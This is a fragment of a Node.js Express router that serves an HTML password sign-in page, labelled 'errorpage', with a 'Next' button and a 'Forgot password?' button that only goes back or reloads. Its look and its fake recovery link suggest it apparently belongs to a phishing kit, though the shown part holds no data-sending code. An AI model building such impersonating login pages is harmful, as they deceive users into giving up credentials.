                    togglePassword.addEventListener("click", function () {
                        const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
                        passwordInput.setAttribute("type", type);
                    });

                    // Add 'focused' class on focus and remove on blur
                    passwordInput.addEventListener("focus", function () {
                        this.classList.add("focused");
                    });

                    // Keep the 'focused' class even after blur
                    passwordInput.addEventListener("blur", function () {
                        if (this.value.trim() !== "") {
                            this.classList.add("focused");
                        } else {
                            this.classList.remove("focused");
                        }
                    });

                    // Forgot Password Functionality
                    function forgotPassword() {
                       if (history.length > 1) {
                                    history.back();  // Go back if there's history
                                } else {
                                    location.reload();  // Refresh current page instead of alert/redirect
                                }
                            }
                </script>

                <div class="fgtpwd">
                    <button type="button" id="myButton" class="hyperl" onclick="forgotPassword()">Forgot password?</button>&nbsp;&nbsp;&nbsp;
                    <button type="submit" class="btnnxt">Next</button>
                </div>
            </div>
        </form>
    </div>

    <!-- Bottom Section -->
    <div class="btmdiv">
        <div class="left-div">
            <select class="btmhypl" id="language-select">
                <option value="en">English (United States)</option>
                <option value="fr">French</option>
                <option value="es">Spanish</option>
                <option value="de">German</option>
            </select>
        </div>

        <div class="right-divs">
            <div class="right-div">
                <button id="helpButton" class="btmhypl">Help</button>
            </div>
            <div class="right-div">
                <button id="privacyButton" class="btmhypl">Privacy</button>
            </div>
            <div class="right-div">
                <button id="termsButton" class="btmhypl">Terms</button>
            </div>
        </div>
    </div>
</body>
</html>
        
    `;
  
    res.send(errorpage);
  
  });
  
  
  
  
  });



module.exports = router;
